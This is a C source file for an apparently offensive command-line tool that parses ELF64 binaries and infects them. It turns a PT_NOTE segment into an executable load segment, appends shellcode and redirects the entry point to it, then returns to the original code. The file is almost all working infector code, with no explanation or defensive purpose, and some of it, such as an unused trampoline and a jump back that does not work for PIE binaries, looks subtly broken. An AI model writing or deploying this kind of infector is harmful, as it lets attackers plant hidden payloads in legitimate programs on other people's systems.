#define _GNU_SOURCE
#include <elf.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>

#define SHELLCODE_MAX 512

static const unsigned char default_shellcode[] = {
    0x48, 0x31, 0xd2,
    0x48, 0x8d, 0x35, 0x0c, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc0, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc7, 0x01, 0x00, 0x00, 0x00,
    0x48, 0xc7, 0xc2, 0x0e, 0x00, 0x00, 0x00,
    0x0f, 0x05,
    0x68, 0x6f, 0x6c, 0x6c, 0x6f, 0x77, 0x5f, 0x65, 0x78, 0x65, 0x63, 0x0a, 0x00
};

static void cmd_info(const char *path)
{
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror(path); return; }

    struct stat st;
    fstat(fd, &st);

    void *m = mmap(NULL, (size_t)st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    close(fd);
    if (m == MAP_FAILED) { perror("mmap"); return; }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)m;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "[!] not an ELF file\n"); munmap(m, (size_t)st.st_size); return;
    }

    printf("[*] %s\n", path);
    printf("    entry:    0x%llx\n", (unsigned long long)ehdr->e_entry);
    printf("    phnum:    %u\n", ehdr->e_phnum);
    printf("    shnum:    %u\n", ehdr->e_shnum);
    printf("    type:     %s\n",
           ehdr->e_type == ET_EXEC ? "exec" :
           ehdr->e_type == ET_DYN  ? "dyn (PIE)" : "other");

    Elf64_Phdr *phdr = (Elf64_Phdr *)((char *)m + ehdr->e_phoff);
    for (int i = 0; i < ehdr->e_phnum; i++) {
        printf("    phdr[%2d]: type=%-12s  off=0x%06llx  vaddr=0x%llx  fsz=%llu\n",
               i,
               phdr[i].p_type == PT_LOAD ? "PT_LOAD" :
               phdr[i].p_type == PT_NOTE ? "PT_NOTE" :
               phdr[i].p_type == PT_GNU_STACK ? "PT_GNU_STACK" : "other",
               (unsigned long long)phdr[i].p_offset,
               (unsigned long long)phdr[i].p_vaddr,
               (unsigned long long)phdr[i].p_filesz);
    }
    munmap(m, (size_t)st.st_size);
}

static void cmd_inject(const char *src_path, const char *dst_path,
                       const unsigned char *sc, size_t sc_len)
{
    int src_fd = open(src_path, O_RDONLY);
    if (src_fd < 0) { perror(src_path); return; }

    struct stat st;
    fstat(src_fd, &st);
    size_t orig_size = (size_t)st.st_size;

    void *orig = mmap(NULL, orig_size, PROT_READ, MAP_PRIVATE, src_fd, 0);
    close(src_fd);
    if (orig == MAP_FAILED) { perror("mmap"); return; }

    Elf64_Ehdr *ehdr = (Elf64_Ehdr *)orig;
    if (memcmp(ehdr->e_ident, ELFMAG, SELFMAG) != 0) {
        fprintf(stderr, "[!] not an ELF64 file\n"); munmap(orig, orig_size); return;
    }
    if (ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "[!] not ELF64\n"); munmap(orig, orig_size); return;
    }

    Elf64_Phdr *phdr_arr = (Elf64_Phdr *)((char *)orig + ehdr->e_phoff);
    Elf64_Phdr *note_phdr = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr_arr[i].p_type == PT_NOTE) { note_phdr = &phdr_arr[i]; break; }
    }
    if (!note_phdr) {
        fprintf(stderr, "[!] no PT_NOTE segment found\n"); munmap(orig, orig_size); return;
    }

    size_t new_size = orig_size + sc_len + 8;
    unsigned char *buf = calloc(1, new_size);
    if (!buf) { perror("calloc"); munmap(orig, orig_size); return; }

    memcpy(buf, orig, orig_size);

    Elf64_Ehdr *new_ehdr = (Elf64_Ehdr *)buf;
    Elf64_Phdr *new_phdr_arr = (Elf64_Phdr *)(buf + ehdr->e_phoff);

    Elf64_Phdr *new_note = NULL;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (new_phdr_arr[i].p_type == PT_NOTE) { new_note = &new_phdr_arr[i]; break; }
    }

    uint64_t sc_offset = (uint64_t)orig_size;
    uint64_t sc_vaddr  = 0xc000000ULL + sc_offset;

    unsigned char trampoline[16];
    size_t tr_len = 0;
    uint64_t orig_entry = ehdr->e_entry;

    trampoline[tr_len++] = 0xe8;
    int32_t rel = (int32_t)((sc_vaddr + sc_len + 5) - (sc_vaddr + tr_len + 4));
    memcpy(trampoline + tr_len, &rel, 4); tr_len += 4;

    memcpy(buf + sc_offset, sc, sc_len);

    unsigned char jump_back[12];
    jump_back[0] = 0x48; jump_back[1] = 0xb8;
    memcpy(jump_back + 2, &orig_entry, 8);
    jump_back[10] = 0xff; jump_back[11] = 0xe0;
    memcpy(buf + sc_offset + sc_len, jump_back, sizeof(jump_back));

    new_note->p_type   = PT_LOAD;
    new_note->p_flags  = PF_R | PF_X;
    new_note->p_offset = sc_offset;
    new_note->p_vaddr  = sc_vaddr;
    new_note->p_paddr  = sc_vaddr;
    new_note->p_filesz = sc_len + sizeof(jump_back);
    new_note->p_memsz  = sc_len + sizeof(jump_back);
    new_note->p_align  = 0x1000;

    new_ehdr->e_entry = sc_vaddr;

    int out_fd = open(dst_path, O_WRONLY | O_CREAT | O_TRUNC, st.st_mode);
    if (out_fd < 0) { perror(dst_path); free(buf); munmap(orig, orig_size); return; }

    if (write(out_fd, buf, new_size) != (ssize_t)new_size) perror("write");
    else printf("[+] infected %s -> %s (entry 0x%llx -> 0x%llx)\n",
                src_path, dst_path,
                (unsigned long long)orig_entry,
                (unsigned long long)sc_vaddr);

    close(out_fd);
    free(buf);
    munmap(orig, orig_size);
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr, "usage: %s <info|inject>\n", argv[0]);
        return 1;
    }

    if (strcmp(argv[1], "info") == 0 && argc >= 3) {
        cmd_info(argv[2]);
    } else if (strcmp(argv[1], "inject") == 0 && argc >= 4) {
        cmd_inject(argv[2], argv[3], default_shellcode, sizeof(default_shellcode));
    } else {
        fprintf(stderr, "unknown: %s\n", argv[1]); return 1;
    }
    return 0;
}
